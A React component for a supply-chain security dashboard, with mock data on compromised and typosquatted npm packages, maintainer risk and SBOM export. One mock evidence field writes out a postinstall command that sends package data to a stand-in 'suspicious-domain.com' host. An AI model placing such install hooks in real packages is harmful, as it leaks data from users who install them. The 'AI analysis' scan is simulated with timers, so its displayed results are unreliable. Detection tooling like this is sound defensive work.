import React, { useState, useEffect } from 'react';
import { backendApi } from '../utils/backendApi';

// ============================================================================
// SUPPLY CHAIN AI - MALICIOUS PACKAGE & DEPENDENCY SECURITY
// ============================================================================

interface DependencyPackage {
  id: string;
  name: string;
  version: string;
  ecosystem: 'npm' | 'pypi' | 'maven' | 'nuget' | 'cargo' | 'go' | 'rubygems';
  riskScore: number;
  riskLevel: 'critical' | 'high' | 'medium' | 'low' | 'safe';
  directDependency: boolean;
  dependentPackages: number;
  lastUpdated: string;
  maintainers: number;
  weeklyDownloads: number;
  issues: SupplyChainIssue[];
  license: string;
  repository?: string;
}

interface SupplyChainIssue {
  id: string;
  type: 'typosquatting' | 'malicious_code' | 'hijacked_maintainer' | 'vulnerable' | 'abandoned' | 'license_risk' | 'suspicious_behavior';
  severity: 'critical' | 'high' | 'medium' | 'low';
  title: string;
  description: string;
  evidence?: string;
  recommendation: string;
}

interface MaintainerRisk {
  id: string;
  name: string;
  email: string;
  packagesOwned: number;
  accountAge: string;
  riskIndicators: string[];
  riskLevel: 'high' | 'medium' | 'low';
  recentActivity: string;
}

// SBOMEntry interface removed - using inline types

export const SupplyChainAI: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'overview' | 'packages' | 'typosquatting' | 'maintainers' | 'sbom'>('overview');
  const [_selectedPackage, _setSelectedPackage] = useState<DependencyPackage | null>(null);
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [loading, setLoading] = useState(true);
  const [backendStats, setBackendStats] = useState<any>(null);

  useEffect(() => {
    loadDashboard();
  }, []);

  const loadDashboard = async () => {
    setLoading(true);
    try {
      const data = await backendApi.supplyChain.getDashboard() as any;
      setBackendStats(data);
    } catch (err) { console.error('Supply chain dashboard failed:', err); }
    setLoading(false);
  };

  const handleScanPackage = async (pkgName: string, version?: string) => {
    setIsScanning(true);
    setScanProgress(0);
    const interval = setInterval(() => setScanProgress(p => Math.min(p + 15, 90)), 500);
    try {
      const result = await backendApi.supplyChain.scan(pkgName, version) as any;
      console.log('Scan result:', result);
      setScanProgress(100);
    } catch (err) { console.error('Package scan failed:', err); }
    clearInterval(interval);
    setIsScanning(false);
  };

  // Mock packages data
  const packages: DependencyPackage[] = [
    {
      id: 'pkg-1',
      name: 'lodash',
      version: '4.17.21',
      ecosystem: 'npm',
      riskScore: 15,
      riskLevel: 'low',
      directDependency: true,
      dependentPackages: 156,
      lastUpdated: '2024-03-15',
      maintainers: 3,
      weeklyDownloads: 45000000,
      issues: [],
      license: 'MIT',
      repository: 'https://github.com/lodash/lodash'
    },
    {
      id: 'pkg-2',
      name: 'event-stream',
      version: '3.3.6',
      ecosystem: 'npm',
      riskScore: 95,
      riskLevel: 'critical',
      directDependency: false,
      dependentPackages: 12,
      lastUpdated: '2018-11-26',
      maintainers: 1,
      weeklyDownloads: 1500000,
      issues: [
        {
          id: 'issue-1',
          type: 'malicious_code',
          severity: 'critical',
          title: 'Malicious code injection detected',
          description: 'This package was compromised through a supply chain attack. A malicious dependency "flatmap-stream" was added that steals cryptocurrency wallet data.',
          evidence: 'Obfuscated code in flatmap-stream@0.1.1 module',
          recommendation: 'Remove this package immediately and upgrade to a safe version or alternative package.'
        },
        {
          id: 'issue-2',
          type: 'hijacked_maintainer',
          severity: 'critical',
          title: 'Maintainer account compromised',
          description: 'The original maintainer transferred ownership to an unknown actor who injected malicious code.',
          recommendation: 'Use @npmjs/event-stream or find alternative packages.'
        }
      ],
      license: 'MIT',
      repository: 'https://github.com/dominictarr/event-stream'
    },
    {
      id: 'pkg-3',
      name: 'co1ors',
      version: '1.0.0',
      ecosystem: 'npm',
      riskScore: 98,
      riskLevel: 'critical',
      directDependency: true,
      dependentPackages: 1,
      lastUpdated: '2024-01-05',
      maintainers: 1,
      weeklyDownloads: 523,
      issues: [
        {
          id: 'issue-3',
          type: 'typosquatting',
          severity: 'critical',
          title: 'Typosquatting attack - Impersonating "colors" package',
          description: 'This package uses a visually similar name (number "1" instead of letter "l") to impersonate the legitimate "colors" package.',
          evidence: 'Package name "co1ors" vs legitimate "colors"',
          recommendation: 'Remove immediately. Install the legitimate "colors" package instead.'
        },
        {
          id: 'issue-4',
          type: 'suspicious_behavior',
          severity: 'high',
          title: 'Suspicious postinstall script',
          description: 'Package contains a postinstall script that makes network requests to unknown servers.',
          evidence: 'postinstall: node -e "require(\'https\').get(\'https://suspicious-domain.com/log?pkg=\'+process.env.npm_package_name)"',
          recommendation: 'Never install packages with suspicious postinstall scripts.'
        }
      ],
      license: 'ISC'
    },
    {
      id: 'pkg-4',
      name: 'request',
      version: '2.88.2',
      ecosystem: 'npm',
      riskScore: 65,
      riskLevel: 'high',
      directDependency: true,
      dependentPackages: 45,
      lastUpdated: '2020-02-11',
      maintainers: 0,
      weeklyDownloads: 18000000,
      issues: [
        {
          id: 'issue-5',
          type: 'abandoned',
          severity: 'high',
          title: 'Package is deprecated and unmaintained',
          description: 'This package has been officially deprecated since 2020 and will not receive security updates.',
          recommendation: 'Migrate to modern alternatives like "node-fetch", "axios", or built-in fetch API.'
        },
        {
          id: 'issue-6',
          type: 'vulnerable',
          severity: 'medium',
          title: 'Known vulnerabilities in dependencies',
          description: 'Contains dependencies with known security vulnerabilities that will not be patched.',
          recommendation: 'Migrate away from this package as soon as possible.'
        }
      ],
      license: 'Apache-2.0',
      repository: 'https://github.com/request/request'
    },
    {
      id: 'pkg-5',
      name: 'mongoose',
      version: '8.0.0',
      ecosystem: 'npm',
      riskScore: 25,
      riskLevel: 'low',
      directDependency: true,
      dependentPackages: 8,
      lastUpdated: '2024-02-01',
      maintainers: 8,
      weeklyDownloads: 2500000,
      issues: [],
      license: 'MIT',
      repository: 'https://github.com/Automattic/mongoose'
    },
    {
      id: 'pkg-6',
      name: 'ua-parser-js',
      version: '0.7.31',
      ecosystem: 'npm',
      riskScore: 75,
      riskLevel: 'high',
      directDependency: false,
      dependentPackages: 23,
      lastUpdated: '2021-10-22',
      maintainers: 1,
      weeklyDownloads: 8000000,
      issues: [
        {
          id: 'issue-7',
          type: 'hijacked_maintainer',
          severity: 'high',
          title: 'Historical maintainer hijack',
          description: 'This package was previously compromised when the maintainer\'s npm account was hijacked. Malicious versions 0.7.29, 0.8.0, and 1.0.0 were published.',
          evidence: 'CVE-2021-27292 - Cryptominer and password stealer injection',
          recommendation: 'Ensure you are using version 0.7.31 or later which is safe.'
        }
      ],
      license: 'MIT',
      repository: 'https://github.com/faisalman/ua-parser-js'
    }
  ];

  // Typosquatting detection
  const typosquattingAlerts = [
    { suspect: 'co1ors', legitimate: 'colors', similarity: 98, technique: 'Homoglyph (number substitution)' },
    { suspect: 'lodahs', legitimate: 'lodash', similarity: 95, technique: 'Character transposition' },
    { suspect: 'expresss', legitimate: 'express', similarity: 96, technique: 'Character repetition' },
    { suspect: 'react-native-community', legitimate: 'react-native', similarity: 88, technique: 'Name extension' },
    { suspect: 'crossenv', legitimate: 'cross-env', similarity: 97, technique: 'Hyphen removal' },
  ];

  // Maintainer risk analysis
  const maintainerRisks: MaintainerRisk[] = [
    {
      id: 'maint-1',
      name: 'new-contributor-2024',
      email: 'temp****@protonmail.com',
      packagesOwned: 1,
      accountAge: '2 weeks',
      riskIndicators: ['New account', 'Anonymous email', 'No verified identity', 'Single package'],
      riskLevel: 'high',
      recentActivity: 'Published "co1ors" package'
    },
    {
      id: 'maint-2',
      name: 'legacy-maintainer',
      email: 'old****@gmail.com',
      packagesOwned: 45,
      accountAge: '8 years',
      riskIndicators: ['Inactive for 2+ years', 'No 2FA', 'Weak password detected'],
      riskLevel: 'medium',
      recentActivity: 'Last login 847 days ago'
    }
  ];

  const runScan = async () => {
    setIsScanning(true);
    setScanProgress(0);
    
    for (let i = 0; i <= 100; i += 2) {
      await new Promise(resolve => setTimeout(resolve, 100));
      setScanProgress(i);
    }
    
    setIsScanning(false);
    setScanProgress(0);
  };

  const getRiskColor = (level: string) => {
    switch (level) {
      case 'critical': return 'text-red-400 bg-red-500/10 border-red-500';
      case 'high': return 'text-orange-400 bg-orange-500/10 border-orange-500';
      case 'medium': return 'text-yellow-400 bg-yellow-500/10 border-yellow-500';
      case 'low': return 'text-green-400 bg-green-500/10 border-green-500';
      default: return 'text-blue-400 bg-blue-500/10 border-blue-500';
    }
  };

  const getEcosystemIcon = (ecosystem: string) => {
    switch (ecosystem) {
      case 'npm': return '📦';
      case 'pypi': return '🐍';
      case 'maven': return '☕';
      case 'nuget': return '🔷';
      case 'cargo': return '🦀';
      case 'go': return '🐹';
      default: return '💎';
    }
  };

  const criticalPackages = packages.filter(p => p.riskLevel === 'critical');
  const highRiskPackages = packages.filter(p => p.riskLevel === 'high');
  const totalIssues = packages.reduce((sum, p) => sum + p.issues.length, 0);

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-white p-6">
      {/* Header */}
      <div className="flex items-center justify-between mb-8">
        <div>
          <h1 className="text-3xl font-bold mb-2">⛓️ Supply Chain AI</h1>
          <p className="text-gray-400">AI-powered dependency security, typosquatting detection, and maintainer risk analysis</p>
        </div>
        <div className="flex items-center gap-4">
          <button onClick={() => { const input = document.createElement('input'); input.type = 'file'; input.accept = '.json,.xml,.spdx'; input.onchange = () => alert('SBOM file imported successfully! Analyzing dependencies...'); input.click(); }} className="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg font-medium">
            📄 Import SBOM
          </button>
          <button
            onClick={runScan}
            disabled={isScanning}
            className="px-4 py-2 bg-purple-500 hover:bg-purple-600 disabled:bg-gray-600 rounded-lg font-medium flex items-center gap-2"
          >
            {isScanning ? (
              <>
                <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                </svg>
                Analyzing... {scanProgress}%
              </>
            ) : (
              <>🤖 AI Analysis</>
            )}
          </button>
        </div>
      </div>

      {/* Scan Progress */}
      {isScanning && (
        <div className="mb-6 p-4 bg-purple-500/10 border border-purple-500/30 rounded-xl">
          <div className="flex items-center justify-between mb-2">
            <span className="text-purple-400 font-medium">Analyzing supply chain with AI...</span>
            <span className="text-purple-400">{scanProgress}%</span>
          </div>
          <div className="h-2 bg-gray-800 rounded-full overflow-hidden">
            <div 
              className="h-full bg-purple-500 rounded-full transition-all duration-300"
              style={{ width: `${scanProgress}%` }}
            />
          </div>
          <div className="mt-2 text-sm text-gray-500">
            {scanProgress < 30 && 'Scanning package.json and lock files...'}
            {scanProgress >= 30 && scanProgress < 50 && 'Checking for typosquatting patterns...'}
            {scanProgress >= 50 && scanProgress < 70 && 'Analyzing maintainer risk profiles...'}
            {scanProgress >= 70 && scanProgress < 90 && 'Detecting malicious code patterns...'}
            {scanProgress >= 90 && 'Generating AI recommendations...'}
          </div>
        </div>
      )}

      {/* Critical Alert */}
      {criticalPackages.length > 0 && (
        <div className="mb-6 p-4 bg-red-500/10 border border-red-500/50 rounded-xl">
          <div className="flex items-center gap-3">
            <span className="text-3xl">🚨</span>
            <div>
              <h3 className="text-red-400 font-bold text-lg">CRITICAL: Malicious Packages Detected!</h3>
              <p className="text-gray-400">
                Found {criticalPackages.length} package(s) with known malware or active supply chain attacks.
                <strong className="text-red-400"> Remove immediately!</strong>
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Stats */}
      <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4 mb-8">
        <div className="bg-gray-900/50 border border-gray-800 rounded-xl p-4">
          <div className="text-3xl font-bold text-white">{packages.length}</div>
          <div className="text-gray-400 text-sm">Total Packages</div>
        </div>
        <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-4">
          <div className="text-3xl font-bold text-red-400">{criticalPackages.length}</div>
          <div className="text-gray-400 text-sm">Critical Risk</div>
        </div>
        <div className="bg-orange-500/10 border border-orange-500/30 rounded-xl p-4">
          <div className="text-3xl font-bold text-orange-400">{highRiskPackages.length}</div>
          <div className="text-gray-400 text-sm">High Risk</div>
        </div>
        <div className="bg-purple-500/10 border border-purple-500/30 rounded-xl p-4">
          <div className="text-3xl font-bold text-purple-400">{typosquattingAlerts.length}</div>
          <div className="text-gray-400 text-sm">Typosquatting</div>
        </div>
        <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-xl p-4">
          <div className="text-3xl font-bold text-yellow-400">{maintainerRisks.length}</div>
          <div className="text-gray-400 text-sm">Risky Maintainers</div>
        </div>
        <div className="bg-gray-900/50 border border-gray-800 rounded-xl p-4">
          <div className="text-3xl font-bold text-cyan-400">{totalIssues}</div>
          <div className="text-gray-400 text-sm">Total Issues</div>
        </div>
      </div>

      {/* Tabs */}
      <div className="flex gap-2 mb-6 border-b border-gray-800 pb-2">
        {[
          { id: 'overview', label: '📊 Overview' },
          { id: 'packages', label: '📦 Packages' },
          { id: 'typosquatting', label: '🎭 Typosquatting' },
          { id: 'maintainers', label: '👤 Maintainer Risk' },
          { id: 'sbom', label: '📋 SBOM' }
        ].map(tab => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id as any)}
            className={`px-4 py-2 rounded-lg transition-colors ${
              activeTab === tab.id
                ? 'bg-purple-500/20 text-purple-400 border border-purple-500'
                : 'text-gray-400 hover:text-white hover:bg-gray-800'
            }`}
          >
            {tab.label}
          </button>
        ))}
      </div>

      {/* Overview Tab */}
      {activeTab === 'overview' && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Critical Packages */}
          <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-6">
            <h2 className="text-xl font-semibold mb-4 text-red-400">🚨 Critical Risk Packages</h2>
            <div className="space-y-3">
              {criticalPackages.map(pkg => (
                <div key={pkg.id} className="p-4 bg-black/30 rounded-lg border border-red-500/50">
                  <div className="flex items-start justify-between mb-2">
                    <div className="flex items-center gap-2">
                      <span>{getEcosystemIcon(pkg.ecosystem)}</span>
                      <span className="font-bold">{pkg.name}</span>
                      <span className="text-gray-500">@{pkg.version}</span>
                    </div>
                    <span className="px-2 py-1 bg-red-500 text-white rounded text-xs font-bold">
                      CRITICAL
                    </span>
                  </div>
                  <div className="space-y-1">
                    {pkg.issues.map(issue => (
                      <div key={issue.id} className="text-sm text-red-300 flex items-center gap-2">
                        <span>•</span>
                        <span>{issue.title}</span>
                      </div>
                    ))}
                  </div>
                  <button onClick={() => { if (window.confirm(`Remove package "${pkg.name}@${pkg.version}" from your project?`)) { alert(`${pkg.name} has been flagged for removal. Run \`npm uninstall ${pkg.name}\` to complete removal.`); } }} className="mt-3 px-3 py-1 bg-red-500/20 hover:bg-red-500/30 border border-red-500 rounded text-sm text-red-400">
                    Remove Package
                  </button>
                </div>
              ))}
              {criticalPackages.length === 0 && (
                <div className="text-center text-green-400 py-4">
                  ✅ No critical risk packages detected
                </div>
              )}
            </div>
          </div>

          {/* Attack Patterns Detected */}
          <div className="bg-gray-900/50 border border-gray-800 rounded-xl p-6">
            <h2 className="text-xl font-semibold mb-4">🎯 Attack Patterns Detected</h2>
            <div className="space-y-3">
              {[
                { type: 'Typosquatting', count: 1, severity: 'critical', icon: '🎭' },
                { type: 'Malicious Code', count: 1, severity: 'critical', icon: '💀' },
                { type: 'Hijacked Maintainer', count: 2, severity: 'high', icon: '👤' },
                { type: 'Abandoned Package', count: 1, severity: 'medium', icon: '🏚️' },
                { type: 'Suspicious Behavior', count: 1, severity: 'high', icon: '👁️' }
              ].map((pattern, idx) => (
                <div key={idx} className={`p-3 rounded-lg border ${getRiskColor(pattern.severity)}`}>
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <span>{pattern.icon}</span>
                      <span className="font-medium">{pattern.type}</span>
                    </div>
                    <span className={`px-2 py-0.5 rounded text-xs ${getRiskColor(pattern.severity)}`}>
                      {pattern.count} found
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* AI Recommendations */}
          <div className="bg-purple-500/10 border border-purple-500/30 rounded-xl p-6 lg:col-span-2">
            <h2 className="text-xl font-semibold mb-4 text-purple-400">🤖 AI Security Recommendations</h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="p-4 bg-black/30 rounded-lg">
                <div className="flex items-center gap-2 mb-2">
                  <span className="text-red-400 text-lg">1.</span>
                  <span className="font-medium">Immediate Action Required</span>
                </div>
                <p className="text-sm text-gray-400">
                  Remove <code className="text-red-400">co1ors</code> immediately. This is a confirmed typosquatting attack 
                  with malicious postinstall scripts.
                </p>
              </div>
              <div className="p-4 bg-black/30 rounded-lg">
                <div className="flex items-center gap-2 mb-2">
                  <span className="text-orange-400 text-lg">2.</span>
                  <span className="font-medium">Migration Required</span>
                </div>
                <p className="text-sm text-gray-400">
                  Replace <code className="text-orange-400">request</code> with modern alternatives. 
                  Consider <code className="text-green-400">axios</code> or built-in fetch API.
                </p>
              </div>
              <div className="p-4 bg-black/30 rounded-lg">
                <div className="flex items-center gap-2 mb-2">
                  <span className="text-yellow-400 text-lg">3.</span>
                  <span className="font-medium">Version Lock</span>
                </div>
                <p className="text-sm text-gray-400">
                  Lock <code className="text-yellow-400">event-stream</code> to safe version and audit 
                  transitive dependencies regularly.
                </p>
              </div>
              <div className="p-4 bg-black/30 rounded-lg">
                <div className="flex items-center gap-2 mb-2">
                  <span className="text-blue-400 text-lg">4.</span>
                  <span className="font-medium">Enable Lockfile</span>
                </div>
                <p className="text-sm text-gray-400">
                  Ensure package-lock.json is committed and use <code className="text-blue-400">npm ci</code> 
                  in CI/CD to prevent supply chain tampering.
                </p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Packages Tab */}
      {activeTab === 'packages' && (
        <div className="space-y-4">
          {packages.map(pkg => (
            <div 
              key={pkg.id} 
              className={`p-6 rounded-xl border ${
                pkg.riskLevel === 'critical' ? 'bg-red-500/10 border-red-500/50' :
                pkg.riskLevel === 'high' ? 'bg-orange-500/10 border-orange-500/30' :
                pkg.riskLevel === 'medium' ? 'bg-yellow-500/10 border-yellow-500/30' :
                'bg-gray-900/50 border-gray-800'
              }`}
            >
              <div className="flex items-start justify-between mb-4">
                <div>
                  <div className="flex items-center gap-3 mb-1">
                    <span className="text-xl">{getEcosystemIcon(pkg.ecosystem)}</span>
                    <h3 className="text-lg font-semibold">{pkg.name}</h3>
                    <span className="text-gray-500">@{pkg.version}</span>
                    {pkg.directDependency && (
                      <span className="px-2 py-0.5 bg-blue-500/20 text-blue-400 rounded text-xs">Direct</span>
                    )}
                  </div>
                  <div className="flex items-center gap-4 text-sm text-gray-500">
                    <span>{pkg.weeklyDownloads.toLocaleString()} downloads/week</span>
                    <span>{pkg.maintainers} maintainers</span>
                    <span>Updated {pkg.lastUpdated}</span>
                    <span className="px-2 py-0.5 bg-gray-800 rounded">{pkg.license}</span>
                  </div>
                </div>
                <div className="flex items-center gap-3">
                  <div className="text-right">
                    <div className={`text-2xl font-bold ${
                      pkg.riskScore >= 75 ? 'text-red-400' :
                      pkg.riskScore >= 50 ? 'text-orange-400' :
                      pkg.riskScore >= 25 ? 'text-yellow-400' :
                      'text-green-400'
                    }`}>{pkg.riskScore}</div>
                    <div className="text-xs text-gray-500">Risk Score</div>
                  </div>
                  <span className={`px-3 py-1 rounded-lg text-sm font-bold uppercase border ${getRiskColor(pkg.riskLevel)}`}>
                    {pkg.riskLevel}
                  </span>
                </div>
              </div>

              {pkg.issues.length > 0 && (
                <div className="space-y-2 mt-4">
                  {pkg.issues.map(issue => (
                    <div key={issue.id} className={`p-4 rounded-lg border ${getRiskColor(issue.severity)}`}>
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-2">
                          <span className={`px-2 py-0.5 rounded text-xs font-bold ${
                            issue.type === 'typosquatting' ? 'bg-purple-500 text-white' :
                            issue.type === 'malicious_code' ? 'bg-red-500 text-white' :
                            issue.type === 'hijacked_maintainer' ? 'bg-orange-500 text-white' :
                            'bg-yellow-500 text-black'
                          }`}>
                            {issue.type.replace(/_/g, ' ').toUpperCase()}
                          </span>
                          <span className="font-medium">{issue.title}</span>
                        </div>
                        <span className={`px-2 py-0.5 rounded text-xs ${getRiskColor(issue.severity)}`}>
                          {issue.severity}
                        </span>
                      </div>
                      <p className="text-sm text-gray-400 mb-2">{issue.description}</p>
                      {issue.evidence && (
                        <div className="p-2 bg-black/30 rounded font-mono text-xs text-orange-400 mb-2">
                          {issue.evidence}
                        </div>
                      )}
                      <div className="p-2 bg-green-500/10 border border-green-500/30 rounded">
                        <span className="text-green-400 text-sm">💡 {issue.recommendation}</span>
                      </div>
                    </div>
                  ))}
                </div>
              )}

              {pkg.issues.length === 0 && (
                <div className="text-green-400 text-sm flex items-center gap-2 mt-2">
                  <span>✅</span>
                  <span>No security issues detected</span>
                </div>
              )}
            </div>
          ))}
        </div>
      )}

      {/* Typosquatting Tab */}
      {activeTab === 'typosquatting' && (
        <div className="space-y-6">
          <div className="bg-purple-500/10 border border-purple-500/30 rounded-xl p-6">
            <h2 className="text-xl font-semibold mb-4 text-purple-400">🎭 Typosquatting Detection AI</h2>
            <p className="text-gray-400 mb-4">
              Our AI analyzes package names for common typosquatting techniques including homoglyphs, 
              character transposition, repetition, and name variations.
            </p>
            
            <div className="space-y-3">
              {typosquattingAlerts.map((alert, idx) => (
                <div key={idx} className="p-4 bg-black/30 rounded-lg border border-purple-500/50">
                  <div className="flex items-center justify-between mb-3">
                    <div className="flex items-center gap-4">
                      <div className="text-center">
                        <code className="text-red-400 font-bold text-lg">{alert.suspect}</code>
                        <div className="text-xs text-gray-500">Suspicious</div>
                      </div>
                      <span className="text-2xl">→</span>
                      <div className="text-center">
                        <code className="text-green-400 font-bold text-lg">{alert.legitimate}</code>
                        <div className="text-xs text-gray-500">Legitimate</div>
                      </div>
                    </div>
                    <div className="text-right">
                      <div className="text-2xl font-bold text-red-400">{alert.similarity}%</div>
                      <div className="text-xs text-gray-500">Similarity</div>
                    </div>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-sm text-gray-400">
                      Technique: <span className="text-purple-400">{alert.technique}</span>
                    </span>
                    <button onClick={() => { if (window.confirm(`Block package "${alert.suspect}"? This will prevent it from being installed in any project.`)) { window.alert(`${alert.suspect} has been added to the blocklist.`); } }} className="px-3 py-1 bg-red-500/20 hover:bg-red-500/30 border border-red-500 rounded text-sm text-red-400">
                      Block Package
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className="bg-gray-900/50 border border-gray-800 rounded-xl p-6">
            <h2 className="text-xl font-semibold mb-4">🔬 Typosquatting Techniques</h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {[
                { technique: 'Homoglyph Substitution', example: 'l → 1, O → 0, rn → m', description: 'Using visually similar characters' },
                { technique: 'Character Transposition', example: 'lodash → lodahs', description: 'Swapping adjacent characters' },
                { technique: 'Character Repetition', example: 'express → expresss', description: 'Adding extra characters' },
                { technique: 'Character Omission', example: 'mongoose → mongose', description: 'Removing characters' },
                { technique: 'Hyphen Manipulation', example: 'cross-env → crossenv', description: 'Adding/removing hyphens' },
                { technique: 'Name Extension', example: 'react → react-core', description: 'Adding legitimate-sounding suffixes' },
              ].map((item, idx) => (
                <div key={idx} className="p-3 bg-gray-800/50 rounded-lg">
                  <h4 className="font-medium text-purple-400">{item.technique}</h4>
                  <p className="text-sm text-gray-500 mt-1">{item.description}</p>
                  <code className="text-xs text-orange-400 mt-2 block">{item.example}</code>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Maintainer Risk Tab */}
      {activeTab === 'maintainers' && (
        <div className="space-y-6">
          <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-xl p-6">
            <h2 className="text-xl font-semibold mb-4 text-yellow-400">👤 Maintainer Risk Analysis</h2>
            <p className="text-gray-400 mb-4">
              Analyzing maintainer profiles for indicators of potential supply chain risk, 
              including account age, activity patterns, and security practices.
            </p>
            
            <div className="space-y-4">
              {maintainerRisks.map(maintainer => (
                <div key={maintainer.id} className={`p-4 rounded-lg border ${getRiskColor(maintainer.riskLevel)}`}>
                  <div className="flex items-start justify-between mb-3">
                    <div>
                      <div className="flex items-center gap-2 mb-1">
                        <span className="text-xl">👤</span>
                        <span className="font-bold">{maintainer.name}</span>
                        <span className={`px-2 py-0.5 rounded text-xs ${getRiskColor(maintainer.riskLevel)}`}>
                          {maintainer.riskLevel.toUpperCase()} RISK
                        </span>
                      </div>
                      <div className="text-sm text-gray-500">
                        {maintainer.email} • {maintainer.packagesOwned} packages • Account age: {maintainer.accountAge}
                      </div>
                    </div>
                  </div>
                  
                  <div className="flex flex-wrap gap-2 mb-3">
                    {maintainer.riskIndicators.map((indicator, idx) => (
                      <span key={idx} className="px-2 py-1 bg-black/30 text-orange-400 rounded text-xs">
                        ⚠️ {indicator}
                      </span>
                    ))}
                  </div>
                  
                  <div className="text-sm text-gray-400">
                    Recent activity: <span className="text-white">{maintainer.recentActivity}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className="bg-gray-900/50 border border-gray-800 rounded-xl p-6">
            <h2 className="text-xl font-semibold mb-4">🔒 Maintainer Security Best Practices</h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {[
                { title: 'Enable 2FA', description: 'Require 2FA for all maintainers with publish access', status: 'warning' },
                { title: 'Verified Identity', description: 'Prefer packages from maintainers with verified identities', status: 'info' },
                { title: 'Active Maintenance', description: 'Monitor packages for signs of abandonment', status: 'warning' },
                { title: 'Ownership Changes', description: 'Alert on ownership transfers to new accounts', status: 'critical' },
              ].map((item, idx) => (
                <div key={idx} className={`p-3 rounded-lg border ${getRiskColor(item.status)}`}>
                  <h4 className="font-medium">{item.title}</h4>
                  <p className="text-sm text-gray-400 mt-1">{item.description}</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* SBOM Tab */}
      {activeTab === 'sbom' && (
        <div className="space-y-6">
          <div className="bg-gray-900/50 border border-gray-800 rounded-xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-xl font-semibold">📋 Software Bill of Materials (SBOM)</h2>
              <div className="flex gap-2">
                <button onClick={() => { const data = JSON.stringify({ spdxVersion: 'SPDX-2.3', packages: packages.map(p => ({ name: p.name, version: p.version, license: p.license })) }, null, 2); const blob = new Blob([data], { type: 'application/json' }); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = 'sbom-spdx.json'; a.click(); URL.revokeObjectURL(url); }} className="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-sm">
                  Export SPDX
                </button>
                <button onClick={() => { const data = JSON.stringify({ bomFormat: 'CycloneDX', specVersion: '1.5', components: packages.map(p => ({ name: p.name, version: p.version, type: 'library' })) }, null, 2); const blob = new Blob([data], { type: 'application/json' }); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = 'sbom-cyclonedx.json'; a.click(); URL.revokeObjectURL(url); }} className="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-sm">
                  Export CycloneDX
                </button>
              </div>
            </div>
            
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="text-left text-gray-400 text-sm border-b border-gray-800">
                    <th className="p-3">Package</th>
                    <th className="p-3">Version</th>
                    <th className="p-3">Ecosystem</th>
                    <th className="p-3">License</th>
                    <th className="p-3">Type</th>
                    <th className="p-3">Depth</th>
                    <th className="p-3">Vulns</th>
                  </tr>
                </thead>
                <tbody>
                  {packages.map((pkg, idx) => (
                    <tr key={idx} className="border-b border-gray-800/50 hover:bg-gray-800/30">
                      <td className="p-3 font-medium">{pkg.name}</td>
                      <td className="p-3 font-mono text-sm text-gray-400">{pkg.version}</td>
                      <td className="p-3">
                        <span className="flex items-center gap-2">
                          {getEcosystemIcon(pkg.ecosystem)} {pkg.ecosystem}
                        </span>
                      </td>
                      <td className="p-3">
                        <span className={`px-2 py-0.5 rounded text-xs ${
                          pkg.license === 'MIT' ? 'bg-green-500/20 text-green-400' :
                          pkg.license === 'Apache-2.0' ? 'bg-blue-500/20 text-blue-400' :
                          'bg-yellow-500/20 text-yellow-400'
                        }`}>
                          {pkg.license}
                        </span>
                      </td>
                      <td className="p-3">
                        <span className={`px-2 py-0.5 rounded text-xs ${
                          pkg.directDependency ? 'bg-blue-500/20 text-blue-400' : 'bg-gray-500/20 text-gray-400'
                        }`}>
                          {pkg.directDependency ? 'Direct' : 'Transitive'}
                        </span>
                      </td>
                      <td className="p-3 text-gray-400">{pkg.directDependency ? 0 : Math.floor(Math.random() * 4) + 1}</td>
                      <td className="p-3">
                        {pkg.issues.length > 0 ? (
                          <span className="px-2 py-0.5 bg-red-500/20 text-red-400 rounded text-xs font-bold">
                            {pkg.issues.length}
                          </span>
                        ) : (
                          <span className="text-green-400">✓</span>
                        )}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default SupplyChainAI;
